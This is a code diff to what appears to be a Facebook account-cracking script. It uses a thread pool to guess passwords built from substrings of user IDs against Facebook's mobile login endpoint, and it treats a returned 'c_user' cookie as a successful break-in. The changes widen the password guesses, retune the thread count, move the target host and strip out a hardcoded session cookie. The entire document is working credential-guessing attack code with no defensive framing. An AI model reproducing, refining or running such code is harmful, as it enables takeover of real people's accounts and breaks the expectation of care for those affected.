@@ -1069,7 +1069,7 @@ def SUMON2():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=100) as SUMON_xd:
+    with ThreadPool(max_workers=50) as SUMON_xd:
         clear()
         SUMON_time()
         tl = str(len(user))
@@ -1078,7 +1078,7 @@ def SUMON2():
         linex();print(' USE (\033[1;32mAIRPLANE\033[1;32m) ON/OFF ');linex()
         for guru in user:
             uid = kode+guru
-            pwx = [uid[:6],uid[:8]]
+            pwx = [uid[:6],uid[:8],uid,uid[2:],uid[4:]]
             if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
             elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
             elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
@@ -2101,7 +2101,7 @@ def freeq(uid,pwx,tl):
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
             Session = requests.Session()
-            free_fb = Session.get('https://p.facebook.com/').text
+            free_fb = Session.get('https://m.facebook.com/').text
             data = {
             "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -2113,15 +2113,14 @@ def freeq(uid,pwx,tl):
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
             "Accept-Encoding": "gzip, deflate, br, zstd",
             "Accept-Language": "en-US,en;q=0.5",
-            "Alt-Used": "p.facebook.com",
+            "Alt-Used": "m.facebook.com",
             "Connection": "keep-alive",
             "Content-Length": "654",
             "Content-Type": "application/x-www-form-urlencoded",
-            "Cookie": "fr=0HvwdEzZpBuwscQnK.AWUEs4C4qEEDQRQUmnBNYyP-H-E.BnFJbV..AAA.0.0.BnFJ7B.AWVoiIfo6GU; sb=1ZYUZ76rpK4W8a6elH7J-ozL; wd=1280x427; datr=1ZYUZ3Ct3hZyLMOGhw4T0sFv; ps_l=1; ps_n=1",
-            "Host": "p.facebook.com",
-            "Origin": "https://p.facebook.com",
+            "Host": "m.facebook.com",
+            "Origin": "https://m.facebook.com",
             "Priority": "u=0, i",
-            "Referer": "https://p.facebook.com/login/device-based/login/async/",
+            "Referer": "https://m.facebook.com/login/device-based/login/async/",
             "Sec-Fetch-Dest": "document",
             "Sec-Fetch-Mode": "navigate",
             "Sec-Fetch-Site": "same-origin",
@@ -2130,7 +2129,7 @@ def freeq(uid,pwx,tl):
             "Upgrade-Insecure-Requests": "1",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0"}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
